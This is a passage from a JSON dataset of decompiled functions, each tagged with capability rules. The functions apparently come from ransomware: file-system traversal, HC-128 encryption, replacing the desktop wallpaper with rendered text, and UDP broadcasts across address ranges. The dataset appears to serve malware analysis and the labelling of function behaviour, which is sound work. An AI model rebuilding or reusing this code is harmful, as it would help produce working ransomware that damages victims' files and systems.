1;\n        if (*0x42e98c != 0) {\n            do {\n                uVar7 = uVar8;\n                uVar6 = fcn.00405e30(0x4122a4, 7, 0xe9b7eea7, 0);\n                (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, uVar6, uVar7);\n                fcn.0040f475(&ARG_0);\n                uVar6 = fcn.0040f598();\n                uVar6 = fcn.004092af(uVar6);\n                *(*0x42e77c + -4 + uVar8 * 4) = uVar6;\n                uVar8 = uVar8 + 1;\n            } while (uVar8 <= *0x42e98c);\n        }\n    }\n    return;\n}\n",
        "token_count": 2158
    },
    "004031a3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004031a3(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint extraout_ECX;\n    bool bVar8;\n    uint *arg_ch_00;\n    uint uVar9;\n    uint lpOutputString;\n    uint var_118h;\n    uint var_b0h;\n    uint var_48h;\n    uint32_t var_38h;\n    uint var_34h;\n    ushort var_30h;\n    uint var_2eh;\n    uint8_t var_2ah;\n    uint8_t var_29h;\n    ushort uStack44;\n    uint uStack42;\n    ushort uStack38;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t buf;\n    int32_t len;\n    uint32_t var_10h;\n    uint32_t hostshort;\n    uint var_5h;\n    uint8_t var_1h;\n    \n    var_5h._0_1_ = 0;\n    uVar3 = fcn.00405e30(0x4122cc, 7, 0x1de7ce3b, 0);\n    var_38h = fcn.0040f475(uVar3);\n    if (var_38h != 0) {\n        uVar3 = fcn.00405e30(0x4122d4, 10, 0xb5d6957c, 0);\n        var_38h = fcn.0040f475(uVar3);\n        if (var_38h != 0) {\n            hostshort = var_38h;\n            uVar3 = fcn.00405e30(0x4122e0, 7, 0xd2d712a6, 0);\n            fcn.0040f475(uVar3);\n            var_20h = fcn.0040f531();\n            len = 0;\n            if (var_20h == 0) {\n                var_20h = 0xffffffff;\n            }\n            uVar9 = 0;\n            fcn.0040f475(arg_ch, extraout_ECX);\n            uVar3 = fcn.0040f598();\n            var_38h = fcn.00408bae(uVar3, uVar9);\n            if (var_38h != 0) {\n                buf = fcn.0040383a(var_38h, &len);\n                pcVar1 = _sym.imp.USER32.dll_CharLowerBuffA;\n                if (buf != 0) {\n                    (*_sym.imp.USER32.dll_CharLowerBuffA)(buf, len);\n                    fcn.004083cf(buf, len, &var_48h);\n                    uVar3 = fcn.00405e30(0x4122e8, 4, 0x8bd7e921, 0);\n                    len = fcn.004094e9(len, uVar3, var_48h);\n                    (*pcVar1)(buf, len);\n                    uVar3 = fcn.00405e30(0x4122f0, 0xb, 0x2a94cc53, 0);\n                    uVar9 = fcn.00405e30(0x4122fc, 2, 0xd164f58d, 0);\n                    arg_ch_00 = &var_b0h;\n                    fcn.0040f475(uVar9, uVar3, arg_ch_00, &var_118h, &var_34h);\n                    fcn.0040f598();\n                    fcn.00409647(uVar3, arg_ch_00);\n                    uVar3 = fcn.00405e30(0x412300, 4, 0x86dc3d9c, 0);\n                    fcn.0040f475(uVar3);\n                    hostshort = fcn.0040f531();\n                    hostshort = hostshort & 0xffff;\n                    uVar4 = fcn.00409a27();\n                    uVar5 = fcn.004099e5(&var_b0h);\n                    uVar5 = uVar5 & uVar4;\n                    var_10h = ~uVar4 | uVar5;\n                    var_2eh._0_2_ = 0;\n                    var_2eh._2_1_ = 0;\n                    var_2eh._3_1_ = 0;\n                    var_2ah = 0;\n                    var_29h = 0;\n                    uStack44 = 0;\n                    uStack42 = 0;\n                    uStack38 = 0;\n                    var_30h = 2;\n                    var_1ch = uVar5;\n                    var_2eh._0_2_ = (*_sym.imp.WS2_32.dll_htons)(hostshort);\n                    iVar6 = (*_sym.imp.WS2_32.dll_socket)(2, 2, 0x11);\n                    if (iVar6 != -1) {\n                        hostshort = 0;\n                        var_5h._3_1_ = uVar5;\n                        if (var_5h._3_1_ <= var_10h) {\n                            do {\n                                var_1h = uVar5 >> 8;\n                                if (var_1h <= var_10h._1_1_) {\n                                    do {\n                                        while (var_5h._1_1_ = var_1ch._2_1_,  var_1ch._2_1_ <= var_10h._2_1_) {\n                                            while (var_5h._2_1_ = var_1ch._3_1_,  var_1ch._3_1_ <= var_10h._3_1_) {\n                                                bVar8 = hostshort == var_20h;\n                                                hostshort = hostshort + 1;\n                                                if (bVar8) {\n                                                    hostshort = 0;\n                                                    (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n                                                }\n                                                var_2eh._2_1_ = var_5h._3_1_;\n                                                var_2eh._3_1_ = var_1h;\n                                                var_2ah = var_5h._1_1_;\n                                                var_29h = var_5h._2_1_;\n                                                cVar2 = fcn.00403ed8(arg_8h);\n                                                if (cVar2 != '\\0') {\n                                                    uVar3 = (*_sym.imp.WS2_32.dll_inet_ntoa)\n                                                                      (CONCAT13(var_29h, CONCAT12(var_2ah, CONCAT11(\n                                                            var_2eh._3_1_, var_2eh._2_1_))));\n                                                    uVar9 = fcn.00405e30(0x412308, 0x13, 0x4c9d2751, 0);\n                                                    (*_sym.imp.USER32.dll_wsprintfA)(&lpOutputString, uVar9, uVar3, buf)\n                                                    ;\n                                                    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(&lpOutputString);\n                                                }\n                                                iVar7 = (*_sym.imp.WS2_32.dll_sendto)\n                                                                  (iVar6, buf, len, 0, &var_30h, 0x10);\n                                                if (iVar7 == len) {\n                                                    var_5h._0_1_ = 1;\n                                                }\n                                                if (var_5h._2_1_ == 0xff) break;\n                                                var_1ch._3_1_ = var_5h._2_1_ + 1;\n                                            }\n                                            if (var_5h._1_1_ == 0xff) break;\n                                            var_1ch._2_1_ = var_5h._1_1_ + 1;\n                                        }\n                                    } while ((var_1h != 0xff) && (var_1h = var_1h + 1,  var_1h <= var_10h._1_1_));\n                                }\n                            } while ((var_5h._3_1_ != 0xff) &&\n                                    (var_5h._3_1_ = var_5h._3_1_ + 1,  var_5h._3_1_ <= var_10h));\n                        }\n                        fcn.00409a10(iVar6);\n                    }\n                    fcn.00406445();\n                }\n                var_38h = fcn.00406445();\n            }\n        }\n    }\n    return var_38h & 0xffffff00 | var_5h;\n}\n",
        "token_count": 1936
    },
    "004034d6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x004034ee: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x004034f3)\n// WARNING: Removing unreachable block (ram,0x0040351a)\n// WARNING: Removing unreachable block (ram,0x004034f9)\n// WARNING: Removing unreachable block (ram,0x0040350c)\n// WARNING: Removing unreachable block (ram,0x004034fe)\n// WARNING: Removing unreachable block (ram,0x00403526)\n\nvoid __cdecl fcn.004034d6(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    if (*0x42e417 != '\\0') {\n        fcn.00404fb5();\n        *0x42eab8 = arg_ch;\n        return;\n    }\n    return;\n}\n",
        "token_count": 184
    },
    "0040471f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040471f(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    int64_t iVar8;\n    uint lpvObject;\n    int32_t var_9ch;\n    int32_t cScanLines;\n    uint lpbi;\n    int32_t var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    uint var_78h;\n    ushort var_60h;\n    int32_t var_5eh;\n    uint uStack94;\n    uint var_56h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint lprc;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t hgdiobj;\n    uint32_t var_1ch;\n    int32_t pvParam;\n    int32_t hDC;\n    int32_t var_10h;\n    int32_t nWidth;\n    uint32_t var_8h;\n    \n    uVar2 = fcn.00405e30(0x412570, 9, 0x20c292c6, 0);\n    var_8h = fcn.0040f475(uVar2);\n    if (var_8h != 0) {\n        uVar2 = fcn.00405e30(0x41257c, 0x10, 0xbef8325d, 0);\n        fcn.0040f475(uVar2);\n        iVar8 = fcn.0040f531();\n        if (iVar8 != 0) {\n            uVar2 = fcn.00405e30(0x412590, 4, 0x2a5cba1c, 0);\n            puVar7 = &var_24h;\n            fcn.0040f475(uVar2, puVar7);\n            uVar2 = fcn.0040f598();\n            pvParam = fcn.0040383a(uVar2, puVar7);\n            if ((pvParam != 0) && (iVar3 = (*_sym.imp.USER32.dll_GetDC)(0),  iVar3 != 0)) {\n                hDC = iVar3;\n                iVar4 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(iVar3);\n                pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n                var_28h = iVar4;\n                if (iVar4 != 0) {\n                    nWidth = (*_sym.imp.GDI32.dll_GetDeviceCaps)(iVar3, 8);\n                    var_10h = (*pcVar1)(hDC, 10);\n                    hgdiobj = (*_sym.imp.GDI32.dll_CreateCompatibleBitmap)(hDC, nWidth, var_10h);\n                    if (hgdiobj != 0) {\n                        var_24h = (*_sym.imp.GDI32.dll_SelectObject)(iVar4, hgdiobj);\n                        var_1ch = fcn.00405e30(0x412598, 4, 0xede22dd8, 0);\n                        uVar2 = (*pcVar1)(hDC, 0x5a, 0x48);\n                        fcn.0040f475(var_1ch, uVar2);\n                        uVar2 = fcn.0040f531();\n                        iVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(uVar2);\n                        uVar2 = fcn.00406209(0x4125a0, 8, 0x772e3ad7);\n                        var_3ch = (*_sym.imp.GDI32.dll_CreateFontW)(-iVar3, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 4, 0, uVar2);\n                        if (var_3ch != 0) {\n                            var_40h = (*_sym.imp.GDI32.dll_SelectObject)(iVar4, var_3ch);\n                            uVar2 = fcn.00405e30(0x4125ac, 10, 0xdb3cc666, 0);\n                            fcn.0040f475(uVar2);\n                            uVar2 = fcn.0040f531();\n                            (*_sym.imp.GDI32.dll_SetBkColor)(iVar4, uVar2);\n                            uVar2 = fcn.00405e30(0x4125b8, 5, 0x68bf23e1, 0);\n                            fcn.0040f475(uVar2);\n                            uVar2 = fcn.0040f531();\n                            (*_sym.imp.GDI32.dll_SetTextColor)(iVar4, uVar2);\n                            var_48h = nWidth;\n                            lprc = 0;\n                            var_34h = 0;\n                            var_30h = nWidth;\n                            var_2ch = var_10h;\n                            uVar2 = (*_sym.imp.GDI32.dll_GetStockObject)(2);\n                            (*_sym.imp.USER32.dll_FillRect)(iVar4, &lprc, uVar2);\n                            uVar6 = (var_10h * var_48h) / 10;\n                            pcVar1 = _sym.imp.USER32.dll_DrawTextA;\n                            var_44h = var_10h;\n                            uVar5 = var_8h;\n                            while (var_8h = uVar6,  _sym.imp.USER32.dll_DrawTextA = pcVar1,  var_10h = var_44h, \n                                  var_8h != 0) {\n                                uVar5 = fcn.00408a11();\n                                var_1ch = (uVar5 & 0xff) << 8;\n                                uVar5 = fcn.00408a11();\n                                uVar6 = uVar5 & 0xff | var_1ch;\n                                uVar5 = fcn.00408a11();\n                                uVar2 = fcn.00408a11(uVar5 & 0xff | uVar6 << 8);\n                                uVar2 = fcn.00408a11(uVar2);\n                                (*_sym.imp.GDI32.dll_SetPixel)(iVar4, uVar2);\n                                uVar5 = var_8h - 1;\n                                pcVar1 = _sym.imp.USER32.dll_DrawTextA;\n                                var_44h = var_10h;\n                                var_48h = nWidth;\n                                uVar6 = uVar5;\n                            }\n                            var_50h = 0;\n                            var_4ch = 0;\n                            var_8h = uVar5;\n                            (*pcVar1)(iVar4, pvParam, 0xffffffff, &var_50h, 0x411);\n                            var_34h = var_2ch / 2 - var_44h / 2;\n                            (*pcVar1)(iVar4, pvParam, 0xffffffff, &lprc, 0x11);\n                            (*_sym.imp.GDI32.dll_GetObjectW)(hgdiobj, 0x18, &lpvObject);\n                            puVar7 = &var_84h;\n                            for (iVar3 = 9; iVar3 != 0; iVar3 = iVar3 + -1) {\n                                *puVar7 = 0;\n                                puVar7 = puVar7 + 1;\n                            }\n                            var_84h = var_9ch;\n                            var_7ch._0_2_ = 1;\n                            iVar3 = var_9ch * 0x20 + 0x1f;\n                            var_7ch._2_2_ = 0x20;\n                            iVar3 = ((iVar3 >> 0x1f & 0x1fU) + iVar3 >> 5) * cScanLines * 4;\n                            lpbi = 0x28;\n                            var_80h = cScanLines;\n                            var_78h = 0;\n                            var_8h = fcn.00406338(0);\n                            if (var_8h != 0) {\n                                (*_sym.imp.GDI32.dll_GetDIBits)(hDC, hgdiobj, 0, cScanLines, var_8h, &lpbi, 0);\n                                uVar2 = fcn.00406209(0x4125c0, 4, 0xaa48f8bd);\n                                pvParam = fcn.00409aa1(uVar2);\n                                if (pvParam != 0) {\n                                    nWidth = (*_sym.imp.KERNEL32.dll_CreateFileW)(pvParam, 0x40000000, 1, 0, 2, 0x80, 0)\n                                    ;\n                                    pcVar1 = _sym.imp.KERNEL32.dll_WriteFile;\n                                    if (nWidth != -1) {\n                                        uStack94 = 0;\n                                        var_5eh = iVar3 + 0x36;\n                                        var_60h = 0x4d42;\n                                        var_56h = 0x36;\n                                        var_10h = 0;\n                                        (*_sym.imp.KERNEL32.dll_WriteFile)(nWidth, &var_60h, 0xe, &var_10h, 0);\n                                        (*pcVar1)(nWidth, &lpbi, 0x28, &var_10h, 0);\n                                        iVar4 = nWidth;\n                                        (*pcVar1)(nWidth, var_8h, iVar3, &var_10h, 0);\n                                        fcn.00403d7c(iVar4);\n                                        fcn.00408489();\n                                        (*_sym.imp.USER32.dll_SystemParametersInfoW)(0x14, 0, pvParam, 3);\n                                    }\n                                    fcn.00406445();\n                                }\n                                fcn.00406445();\n                            }\n                            (*_sym.imp.GDI32.dll_SelectObject)(var_28h, var_40h);\n                            (*_sym.imp.GDI32.dll_DeleteObject)(var_3ch);\n                            iVar4 = var_28h;\n                        }\n                        (*_sym.imp.GDI32.dll_SelectObject)(iVar4, var_24h);\n                        (*_sym.imp.GDI32.dll_DeleteObject)(hgdiobj);\n                    }\n                    (*_sym.imp.GDI32.dll_DeleteDC)(iVar4);\n                }\n                (*_sym.imp.USER32.dll_ReleaseDC)(0, hDC);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 2389
    },
    "00404c3c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c3c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint lpNumberOfBytesWritten;\n    \n    iVar1 = fcn.00404bdf(arg_8h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar1, 0x40000000, 0, 0, 1, 0, 0);\n        if (iVar1 != -1) {\n            lpNumberOfBytesWritten = *(in_EAX + 0xc);\n            iVar2 = fcn.004037a2(*(in_EAX + 8));\n            if (iVar2 != 0) {\n                (*_sym.imp.KERNEL32.dll_WriteFile)(iVar1, iVar2, lpNumberOfBytesWritten, &lpNumberOfBytesWritten, 0);\n                fcn.00406445();\n            }\n            fcn.00403d7c(iVar1);\n            fcn.00408489();\n        }\n        fcn.00406445();\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "0040553c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040553c(uint arg_8h, code *arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t auStack1652 [4];\n    uint uStack1648;\n    uchar auStack1644 [20];\n    int32_t iStack1624;\n    uint32_t uStack1620;\n    uchar auStack1608 [552];\n    uchar auStack1056 [8];\n    uchar auStack1048 [1044];\n    \n    cVar2 = fcn.00409c6a(auStack1048, arg_8h);\n    if (cVar2 != '\\0') {\n        sub.ntdll.dll_memset(auStack1644, 0, 0x250);\n        uStack1648 = 1;\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(auStack1048, auStack1644);\n        pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n        if (iVar3 != -1) {\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x42e450, 0);\n                if (iVar4 == 0) break;\n                cVar2 = fcn.00409c96();\n                if (cVar2 == '\\0') {\n                    if ((auStack1652[0] & 0x10) == 0) {\n                        cVar2 = fcn.00404f83(auStack1056);\n                        if ((((cVar2 != '\\0') || (cVar2 = fcn.00404f83(auStack1056),  cVar2 == '\\0')) &&\n                            (*0x42e404 <= iStack1624)) &&\n                           (((*0x42e404 < iStack1624 || (*0x42e400 <= uStack1620)) &&\n                            (iVar4 = (*_sym.imp.SHLWAPI.dll_StrChrW)(auStack1608, 0x2e),  iVar4 != 0)))) {\n                            iVar4 = (*arg_ch)(arg_8h, &stack0xfffff988, arg_10h);\n                            if (iVar4 == 0) break;\n                            if (arg_18h != 0) {\n                                (*pcVar1)(arg_18h);\n                            }\n                        }\n                    }\n                    else {\n                        cVar2 = fcn.00409c6a(auStack1056, arg_8h);\n                        if (cVar2 != '\\0') {\n                            if (arg_14h != 0) {\n                                (*pcVar1)(arg_14h);\n                            }\n                            fcn.0040553c(auStack1056, arg_ch, arg_10h, arg_18h, arg_14h);\n                        }\n                    }\n                }\n                iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar3, auStack1652);\n            } while (iVar4 != 0);\n            (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 707
    },
    "00407bf2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00407bf2(void)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int16_t *piVar3;\n    uint32_t uVar4;\n    \n    cVar2 = fcn.00409ec6(0x42eda8);\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    piVar3 = (*_sym.imp.SHLWAPI.dll_PathSkipRootW)(0x42eda8);\n    if (piVar3 == NULL) {\n        piVar3 = 0x42eda8;\n    }\n    do {\n        iVar1 = *piVar3;\n        if (((iVar1 == 0x5c) || (iVar1 == 0x2f)) || (iVar1 == 0)) {\n            *piVar3 = 0;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(0x42eda8);\n            if (uVar4 == 0xffffffff) {\n                uVar4 = (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(0x42eda8, 0);\n            }\n            else {\n                uVar4 = uVar4 & 0x10;\n            }\n            if (uVar4 == 0) {\n                return 0;\n            }\n            if (iVar1 == 0) {\n                return 1;\n            }\n            *piVar3 = iVar1;\n        }\n        piVar3 = piVar3 + 1;\n    } while( true );\n}\n",
        "token_count": 330
    },
    "00408489": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00408489(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    uint lpdwFlags;\n    \n    if (((unaff_ESI != 0) && (unaff_ESI != -1)) &&\n       (iVar1 = (*_sym.imp.KERNEL32.dll_GetHandleInformation)(),  iVar1 != 0)) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        return iVar1 != 0;\n    }\n    return false;\n}\n",
        "token_count": 113
    },
    "004084c2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004084c2(uint pszSrch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_22ch;\n    uint s;\n    uint var_224h;\n    uint pszFirst;\n    \n    cVar1 = fcn.00409ec6(pszSrch);\n    if (cVar1 != '\\0') {\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n        uVar4 = 0;\n        if (iVar2 != -1) {\n            sub.ntdll.dll_memset(&s, 0, 0x228);\n            var_22ch = 0x22c;\n            iVar3 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar2, &var_22ch);\n            while ((uVar4 = 0,  iVar3 != 0 &&\n                   (iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&pszFirst, pszSrch),  uVar4 = var_224h,  iVar3 == 0))) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar2, &var_22ch);\n            }\n            fcn.00408489();\n        }\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 305
    },
    "004099e5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.004099e5(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.WS2_32.dll_inet_addr)(param_1);\n    if (iVar1 == -1) {\n        iVar2 = (*_sym.imp.WS2_32.dll_gethostbyname)(unaff_retaddr);\n        if (iVar2 != 0) {\n            iVar1 = ***(iVar2 + 0xc);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "00409c3f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00409c3f(uint param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    cVar1 = fcn.00409ec6(param_1);\n    if (cVar1 == '\\0') {\n        return false;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(param_1);\n    return iVar2 != -1;\n}\n",
        "token_count": 93
    },
    "00409ffd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409ffd(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint lpHandles;\n    uint8_t *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    cVar1 = fcn.00409e78(arg_ch, arg_8h << 2);\n    if (cVar1 == '\\0') {\n        var_4h = 0;\n    }\n    else {\n        var_4h = 0;\n        if (arg_8h < 0x41) {\n            var_4h = (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(arg_8h, arg_ch, 1, 0xffffffff);\n        }\n        else {\n            iVar2 = (*_sym.imp.KERNEL32.dll_CreateEventW)(0, 1, 0, 0);\n            if (iVar2 != 0) {\n                uVar7 = arg_8h >> 6;\n                if ((arg_8h & 0x3f) != 0) {\n                    uVar7 = uVar7 + 1;\n                }\n                iVar3 = fcn.00406338(0);\n                if (iVar3 != 0) {\n                    puVar4 = fcn.00406338(8);\n                    if (puVar4 != NULL) {\n                        var_8h = 0;\n                        if (uVar7 != 0) {\n                            iVar6 = 0xc;\n                            var_ch = puVar4;\n                            do {\n                                piVar8 = *var_ch;\n                                *piVar8 = iVar2;\n                                piVar8[1] = var_8h << 6;\n                                uVar9 = 0x40;\n                                if (arg_8h < 0x40) {\n                                    uVar9 = arg_8h;\n                                }\n                                piVar8[2] = uVar9;\n                                sub.ntdll.dll_memcpy(*(iVar6 + piVar8), *(arg_ch + -0xc + iVar6), uVar9 << 2);\n                                piVar8[0x44] = -1;\n                                piVar8[0x43] = 1;\n                                piVar8[0x45] = -2;\n                                uVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x409f6c, piVar8, 0, 0);\n                                var_ch = var_ch + 0x118;\n                                *(iVar3 + var_8h * 4) = uVar5;\n                                arg_8h = arg_8h - piVar8[2];\n                                var_8h = var_8h + 1;\n                                iVar6 = iVar6 + 0x100;\n                            } while (var_8h < uVar7);\n                        }\n                        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(uVar7, iVar3, 1, 0xffffffff);\n                        uVar9 = 0;\n                        if (uVar7 != 0) {\n                            do {\n                                var_4h = *(*puVar4 + 0x114);\n                                if ((var_4h == 0x102) || (var_4h == -1)) break;\n                                uVar9 = uVar9 + 1;\n                                puVar4 = puVar4 + 0x118;\n                            } while (uVar9 < uVar7);\n                        }\n                        uVar9 = 0;\n                        if (uVar7 != 0) {\n                            do {\n                                fcn.00408489();\n                                uVar9 = uVar9 + 1;\n                            } while (uVar9 < uVar7);\n                        }\n                        fcn.00406445();\n                    }\n                    fcn.00406445();\n                }\n                fcn.00408489();\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 930
    },
    "0040feb4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040feb4(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iStack12;\n    uint uStack8;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((*(param_1 + 4) & 6) == 0) {\n        iStack12 = param_1;\n        uStack8 = param_3;\n        *(param_2 + -4) = &iStack12;\n        iVar5 = *(param_2 + 0xc);\n        iVar3 = *(param_2 + 8);\n        iVar2 = fcn.004100dd(param_2);\n        if (iVar2 == 0) {\n            *(param_1 + 4) = *(param_1 + 4) | 8;\n        }\n        else {\n            for (; iVar5 != -1; iVar5 = *(iVar3 + iVar5 * 0xc)) {\n                pcVar1 = *(iVar3 + 4 + iVar5 * 0xc);\n                if (pcVar1 != NULL) {\n                    iVar3 = (*pcVar1)();\n                    param_2 = *(puVar4 + 0xc);\n                    if (iVar3 != 0) {\n                        if (iVar3 < 0) {\n                            return 0;\n                        }\n                        iVar3 = *(param_2 + 8);\n                        fcn.0040ffc8(param_2);\n                        puVar4 = param_2 + 0x10;\n                        fcn.00410023(param_2, iVar5);\n                        fcn.004100bf(1);\n                        *(param_2 + 0xc) = *(iVar3 + extraout_ECX * 4);\n                        param_2 = 0;\n                        iVar5 = 0;\n                        (**(iVar3 + 8 + extraout_ECX * 4))();\n                    }\n                }\n                iVar3 = *(param_2 + 8);\n            }\n        }\n    }\n    else {\n        fcn.00410023(param_2, 0xffffffff, &stack0xfffffffc, &stack0xfffffffc);\n    }\n    return 1;\n}\n",
        "token_count": 509
    },
    "00401c4a": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nbool fcn.00401c4a(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar4 = fcn.00401c28(&var_4h);\n    if (iVar4 != 0) {\n        *0x42e410 = fcn.00407bb1(var_4h);\n        if (*0x42e410 != 0) {\n            cVar3 = fcn.004076c0();\n            if (cVar3 == '\\0') {\n                *0x42e42c = 0;\n            }\n            else {\n                *0x42e42c = fcn.0040cf7b();\n            }\n            uVar2 = *0x42e414;\n            uVar6 = *0x42e414 & 0xffff;\n            uVar5 = (*0x42e42c >> 3) - 1 & 0xffff;\n            uVar1 = uVar5 - 0x17;\n            *0x42e414 = *0x42e414 & 0xffff0000 | uVar1 & 0xffff;\n            if (uVar6 <= uVar1) {\n                *0x42e414 = uVar2;\n            }\n            *0x42e41c = (uVar5 - *0x42e414) - 0x17;\n            *0x42e3f0 = *0x42e41c + 0x17 + (*0x42e414 & 0xffff);\n            var_4h = 0;\n            iVar4 = fcn.00401c39(&var_4h);\n            if (iVar4 != 0) {\n                fcn.004083cf(iVar4, var_4h, 0x42e43c);\n                *0x42e418 = fcn.00408bae(iVar4, 0x42e3fc);\n                fcn.00406445();\n            }\n            if (*0x42e418 == 0) {\n                fcn.0040786f();\n                *0x42e410 = 0;\n            }\n        }\n        fcn.00406445();\n    }\n    return *0x42e410 != 0;\n}\n",
        "token_count": 542
    },
    "00402065": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
